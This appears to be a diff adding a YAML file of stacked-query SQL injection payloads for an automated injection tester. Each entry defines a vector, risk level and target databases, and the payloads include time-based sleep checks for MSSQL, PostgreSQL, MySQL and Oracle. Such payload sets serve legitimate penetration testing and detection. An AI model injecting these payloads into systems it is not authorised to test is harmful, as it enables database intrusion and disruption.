@@ -1,0 +1,64 @@
+# Stacked-query payloads.
+# stype 4 = stacked.
+payloads:
+  - title: "Generic stacked queries"
+    stype: 4
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: ";[QUERY]"
+    request:
+      payload: ";SELECT [RANDNUM]"
+
+  - title: "MSSQL stacked queries (no inference)"
+    stype: 4
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: ";[QUERY]"
+    request:
+      payload: ";WAITFOR DELAY '0:0:[SLEEPTIME]'"
+    response:
+      time: 5
+    dbms: ["mssql"]
+
+  - title: "PostgreSQL > 8.1 stacked queries (no inference)"
+    stype: 4
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: ";[QUERY]"
+    request:
+      payload: ";SELECT pg_sleep([SLEEPTIME])"
+    response:
+      time: 5
+    dbms: ["postgresql", "greenplum", "redshift", "cockroachdb", "yugabyte", "alloydb", "opengauss"]
+
+  - title: "MySQL > 5.0 stacked queries (no inference)"
+    stype: 4
+    level: 2
+    risk: 2
+    clause: [0]
+    where: 1
+    vector: ";[QUERY]"
+    request:
+      payload: ";SELECT SLEEP([SLEEPTIME])"
+    response:
+      time: 5
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "Oracle stacked queries via DBMS_LOCK.SLEEP"
+    stype: 4
+    level: 3
+    risk: 3
+    clause: [0]
+    where: 1
+    vector: ";BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END"
+    request:
+      payload: ";BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END"
+    response:
+      time: 5
+    dbms: ["oracle"]
